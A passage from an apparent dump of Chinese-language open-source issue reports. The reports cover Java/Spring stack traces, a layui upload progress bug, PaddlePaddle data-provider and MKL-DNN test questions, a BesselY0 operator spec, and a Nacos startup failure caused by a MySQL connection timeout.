com.farsunset.cim.config.CIMConfig.onApplicationEvent(CIMConfig.java:22) at com.farsunset.cim.config.CIMConfig$$EnhancerBySpringCGLIB$$21b35f73.onApplicationEvent(&lt;generated&gt;) at org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:176) at org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:169) at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:143) at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:421) at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:378) at org.springframework.boot.context.event.EventPublishingRunListener.started(EventPublishingRunListener.java:105) at org.springframework.boot.SpringApplicationRunListeners.lambda$started$5(SpringApplicationRunListeners.java:75) at java.util.ArrayList.forEach(ArrayList.java:1257) at org.springframework.boot.SpringApplicationRunListeners.doWithListeners(SpringApplicationRunListeners.java:117) at org.springframework.boot.SpringApplicationRunListeners.doWithListeners(SpringApplicationRunListeners.java:111) at org.springframework.boot.SpringApplicationRunListeners.started(SpringApplicationRunListeners.java:75) at org.springframework.boot.SpringApplication.run(SpringApplication.java:345) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1340) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1329) at com.farsunset.cim.BootApplication.main(BootApplication.java:31) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)"
拖拽上传 进度条 有bug,"出现错误： Uncaught TypeError: Cannot read property '0' of undefined at XMLHttpRequestUpload. 后来我把这里改了下： options.progress(percent, options.item[0], e); =&gt; options.progress(percent, options.elem[0], e); 这个错误貌似没有了 麻烦高手看看原理上错没错啊   <code>: upload.render({ elem: '.uploader', url: '/inc/upload.php', exts: 'jpg|jpeg|png', multiple: true, progress: function (percent) { console.log(percent) }, choose: function (o) { var files = this.files = o.pushFile(); ..."
关于dataprovider yield数据名称的问题,"在dataprovider中，如果按顺序yield三个vector, 如： 训练没有问题。 有人说最好加个名字，和data_layer的name对应上，于是写成： 这样训练的时候初始化参数会抛出错误： Check failed: PySequence_Check(seq_) 我用的paddle是昨天下载的一件编译版本，难道是版本问题，不支持这种写法么？ #1114:Add external openblas 这个是报错的那个ISSUE   <code>: yield word_vector, tag_vector, label yield {'input_word':word_vector, 'input_tag':tag_vector, 'label':label}"
使用aop、ControllerAdvice处理异常失败,"项目 没有 使用 内部已经集成Web容器 启动。 问题一：aop代码执行不了 在application.yml 加入了：spring: aop: auto: true @月到天心处 @citizenl public class LogAspect { @Pointcut(""execution(public * *(..))"") public void webLog(){} ｝ 代码没有执行 问题二：@ControllerAdvice执行不了 在com.jeesite.modules.sys.web.advice创建 @DY @ControllerAdvice public class ExceptionAdvice { @ExceptionHandler(BaseException.class) public BaseResponse baseException(BaseException ex) { } 也执行不了也行 求救   <code>: @Before(""webLog() &amp;&amp; @annotation(org.springframework.web.bind.annotation.RequestMapping)"") public void deBefore(JoinPoint joinPoint) throws Throwable {} return exception2Response(ex); }"
Clean up for UT coverage,"MKL-DNN related ops UT states. After the PR19011 is merged, the states will be In which, the in should be removed because it is not used in any models should be removed in because this op is not registered and never used too. (Above 2 clean-ups I need to confirm with @wojtuss He is on vocation now.) mul_mkldnn_op.cc is hard to cover more because of virtual functions. Improvements should be done first in and then UT will follow. In , the condition will meet when MKLDNN choose the format by itself, which means one more op like conv should appear before elementwise_mul_mkldnn_op.cc then this condition will be met. I am working on this now.   <code>: group conv transpose conv_tranpose_mkldnn_op.cc in_place sum_mkldnn_op.cc mul_mkldnn_op.cc elementwise_mul_mkldnn_op.cc if (is_x_format_correct &amp;&amp; is_y_format_correct &amp;&amp; are_dims_divisable &amp;&amp; is_avx512_enabled)"
【众智】【计算-GPU开发】BesselY0,"计算Bessel_Y0函数。 x y 对应底层算子 Classify Name Type Type Range Required INPUT x fp16, fp32, double TRUE OUTPUT y fp16, fp32, double TRUE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/api_docs/python/tf/math/special/bessel_y0 3. 异常处理 4. 算子反向 Tensorflow: 参考https://github.com/tensorflow/tensorflow/tree/v2.6.2/tensorflow/python/ops/math_grad.py 中的Bessely0反向算子   <code>: class BesselY0(Primitive):"
使用docker-compose编排部署Nacos模块启动报错,"环境信息 pigx版本: 3.7 是否修改包名: 是 说明：以前docker-compose编排部署Nacos模块是没有问题的，今天突然出现这个问题，nacos启动不了 日志： 2020-05-09 12:26:27.994 INFO 8 --- [ main] c.l.StartingSpringApplicationRunListener : Nacos Log files: /root/nacos/logs/ 2020-05-09 12:26:27.996 INFO 8 --- [ main] c.l.StartingSpringApplicationRunListener : Nacos Conf files: /root/nacos/conf/ 2020-05-09 12:26:27.996 INFO 8 --- [ main] c.l.StartingSpringApplicationRunListener : Nacos Data files: /root/nacos/data/ 2020-05-09 12:26:28.015 INFO 8 --- [ main] c.l.StartingSpringApplicationRunListener : Nacos started successfully in stand alone mode. ,--,: : | Nacos ,| ' : ,---. Running in stand alone mode, All function modules | : : | | ' ,'\ .--.--. Port: 8848 : | \ | : ,--.--. ,---. / / | / / ' Pid: 8 | : ' '; | / \ / . ; ,. :| : /. https://nacos.io ' : | ; .' ,"" .--.; |' ; :__| : | --' / / ,. |' | '.'|\ \ / / /----' '--'. / ; |.' | , .-./\ \ / ------' 2020-05-09 12:26:57.651 INFO 8 --- [ main] o.s.cloud.context.scope.GenericScope : BeanFactory id=133fbcd4-dc7d-3432-b11c-fb9bef1117f0 2020-05-09 12:27:03.800 INFO 8 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.security.config.annotation.configuration.ObjectPostProcessorConfiguration' of type [org.springframework.security.config.annotation.configuration.ObjectPostProcessorConfiguration] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-05-09 12:27:07.010 INFO 8 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'objectPostProcessor' of type [org.springframework.security.config.annotation.configuration.AutowireBeanFactoryObjectPostProcessor] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-05-09 12:27:07.079 INFO 8 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler@5562c41e' of type [org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-05-09 12:27:07.092 INFO 8 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration' of type [org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-05-09 12:27:07.205 INFO 8 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'methodSecurityMetadataSource' of type [org.springframework.security.access.method.DelegatingMethodSecurityMetadataSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-05-09 12:27:14.097 INFO 8 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat initialized with port(s): 8848 (http) 2020-05-09 12:27:14.947 INFO 8 --- [ main] o.s.web.context.ContextLoader : Root WebApplicationContext: initialization completed in 43852 ms org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection; nested exception is org.apache.commons.dbcp.SQLNestedException: Cannot create PoolableConnectionFactory (Communications link failure The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.) at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:82) at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:371) at org.springframework.jdbc.core.JdbcTemplate.update(JdbcTemplate.java:523) at com.alibaba.nacos.config.server.service.BasicDataSourceServiceImpl$SelectMasterTask.run(BasicDataSourceServiceImpl.java:317) at com.alibaba.nacos.config.server.service.BasicDataSourceServiceImpl.reload(BasicDataSourceServiceImpl.java:213) at com.alibaba.nacos.config.server.service.BasicDataSourceServiceImpl.init(BasicDataSourceServiceImpl.java:131) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:416) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1788) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:595) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1108) at com.alibaba.nacos.config.server.service.DynamicDataSource.getDataSource(DynamicDataSource.java:54) at com.alibaba.nacos.config.server.service.PersistService.init(PersistService.java:91) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:416) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1788) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:595) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1287) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1207) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:640) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:116) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1422) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:594) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1287) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1207) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:640) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:116) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1422) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:594) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:879) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:878) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:550) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) at com.alibaba.nacos.EvapNacosApplication.main(EvapNacosApplication.java:38) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.boot.loader.MainMethodRunner.run(MainMethodRunner.java:48) at org.springframework.boot.loader.Launcher.launch(Launcher.java:87) at org.springframework.boot.loader.Launcher.launch(Launcher.java:51) at org.springframework.boot.loader.JarLauncher.main(JarLauncher.java:52) Caused by: org.apache.commons.dbcp.SQLNestedException: Cannot create PoolableConnectionFactory (Communications link failure The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.) at org.apache.commons.dbcp.BasicDataSource.createPoolableConnectionFactory(BasicDataSource.java:1549) at org.apache.commons.dbcp.BasicDataSource.createDataSource(BasicDataSource.java:1388) at org.apache.commons.dbcp.BasicDataSource.getConnection(BasicDataSource.java:1044) at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:158) at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:116) at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:79) ... 82 more Caused by: com.mysql.cj.jdbc.exceptions.CommunicationsException: Communications link failure The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server. at com.mysql.cj.jdbc.exceptions.SQLError.createCommunicationsException(SQLError.java:174) at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:64) at com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:836) at com.mysql.cj.jdbc.ConnectionImpl.(ConnectionImpl.java:456) at com.mysql.cj.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:246) at com.mysql.cj.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:197) at org.apache.commons.dbcp.DriverConnectionFactory.createConnection(DriverConnectionFactory.java:38) at org.apache.commons.dbcp.PoolableConnectionFactory.makeObject(PoolableConnectionFactory.java:582) at org.apache.commons.dbcp.BasicDataSource.validateConnectionFactory(BasicDataSource.java:1556) at org.apache.commons.dbcp.BasicDataSource.createPoolableConnectionFactory(BasicDataSource.java:1545) ... 87 more Caused by: com.mysql.cj.exceptions.CJCommunicationsException: Communications link failure The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server. at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:61) at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:105) at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:151) at com.mysql.cj.exceptions.ExceptionFactory.createCommunicationsException(ExceptionFactory.java:167) at com.mysql.cj.protocol.a.NativeSocketConnection.connect(NativeSocketConnection.java:91) at com.mysql.cj.NativeSession.connect(NativeSession.java:144) at com.mysql.cj.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:956) at com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:826) ... 94 more Caused by: java.net.ConnectException: Connection timed out (Connection timed out) at java.net.PlainSocketImpl.socketConnect(Native Method) at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350) at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206) at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188) at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392) at java.net.Socket.connect(Socket.java:589) at com.mysql.cj.protocol.StandardSocketFactory.connect(StandardSocketFactory.java:155) at com.mysql.cj.protocol.a.NativeSocketConnection.connect(NativeSocketConnection.java:65) ... 97 more 2020-05-09 12:31:58.309 WARN 8 --- [ main] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'opsController' defined in URL [jar:file:/evap-register/evap-register.jar!/BOOT-INF/lib/nacos-config-1.1.4.jar!/com/alibaba/nacos/config/server/controller/OpsController.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dumpService': Invocation of init method failed; nested exception is java.lang.RuntimeException: Nacos Server did not start because dumpservice bean construction failure : No DataSource set 2020-05-09 12:31:59.590 INFO 8 --- [ main] c.l.StartingSpringApplicationRunListener : Nacos Log files: /root/nacos/logs/ 2020-05-09 12:31:59.591 INFO 8 --- [ main] c.l.StartingSpringApplicationRunListener : Nacos Conf files: /root/nacos/conf/ 2020-05-09 12:31:59.591 INFO 8 --- [ main] c.l.StartingSpringApplicationRunListener : Nacos Data files: /root/nacos/data/ 2020-05-09 12:31:59.591 ERROR 8 --- [ main] c.l.StartingSpringApplicationRunListener : Nacos failed to start, please see /root/nacos/logs/nacos.log for more details. 2020-05-09 12:32:00.055 INFO 8 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2020-05-09 12:32:00.178 ERROR 8 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'opsController' defined in URL [jar:file:/evap-register/evap-register.jar!/BOOT-INF/lib/nacos-config-1.1.4.jar!/com/alibaba/nacos/config/server/controller/OpsController.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dumpService': Invocation of init method failed; nested exception is java.lang.RuntimeException: Nacos Server did not start because dumpservice bean construction failure : No DataSource set at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:798) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:228) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1358) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:557) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:879) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:878) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:550) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) at com.alibaba.nacos.EvapNacosApplication.main(EvapNacosApplication.java:38) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.boot.loader.MainMethodRunner.run(MainMethodRunner.java:48) at org.springframework.boot.loader.Launcher.launch(Launcher.java:87) at org.springframework.boot.loader.Launcher.launch(Launcher.java:51) at org.springframework.boot.loader.JarLauncher.main(JarLauncher.java:52) Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dumpService': Invocation of init method failed; nested exception is java.lang.RuntimeException: Nacos Server did not start because dumpservice bean construction failure : No DataSource set at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:160) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:416) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1788) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:595) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1287) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1207) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:885) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:789) ... 27 common frames omitted Caused by: java.lang.RuntimeException: Nacos Server did not start because dumpservice bean construction failure : No DataSource set at com.alibaba.nacos.config.server.service.dump.DumpService.init(DumpService.java:140) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) ... 40 common frames omitted org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection; nested exception is org.apache.commons.dbcp.SQLNestedException: Cannot create PoolableConnectionFactory (Communications link failure The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.) at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:82) at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:371) at org.springframework.jdbc.core.JdbcTemplate.update(JdbcTemplate.java:523) at com.alibaba.nacos.config.server.service.BasicDataSourceServiceImpl$SelectMasterTask.run(BasicDataSourceServiceImpl.java:317) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) at java.util.concurrent.FutureTask.runAndReset(FutureTask.java:308) at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$301(ScheduledThreadPoolExecutor.java:180) at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:294) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) Caused by: org.apache.commons.dbcp.SQLNestedException: Cannot create PoolableConnectionFactory (Communications link failure The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.) at org.apache.commons.dbcp.BasicDataSource.createPoolableConnectionFactory(BasicDataSource.java:1549) at org.apache.commons.dbcp.BasicDataSource.createDataSource(BasicDataSource.java:1388) at org.apache.commons.dbcp.BasicDataSource.getConnection(BasicDataSource.java:1044) at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:158) at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:116) at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:79) ... 10 more Caused by: com.mysql.cj.jdbc.exceptions.CommunicationsException: Communications link failure The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server. at com.mysql.cj.jdbc.exceptions.SQLError.createCommunicationsException(SQLError.java:174) at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:64) at com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:836) at com.mysql.cj.jdbc.ConnectionImpl.(ConnectionImpl.java:456) at com.mysql.cj.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:246) at com.mysql.cj.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:197) at org.apache.commons.dbcp.DriverConnectionFactory.createConnection(DriverConnectionFactory.java:38) at org.apache.commons.dbcp.PoolableConnectionFactory.makeObject(PoolableConnectionFactory.java:582) at org.apache.commons.dbcp.BasicDataSource.validateConnectionFactory(BasicDataSource.java:1556) at org.apache.commons.dbcp.BasicDataSource.createPoolableConnectionFactory(BasicDataSource.java:1545) ... 15 more Caused by: com.mysql.cj.exceptions.CJCommunicationsException: Communications link failure The last packet sent successfully to the server was 0 milliseconds 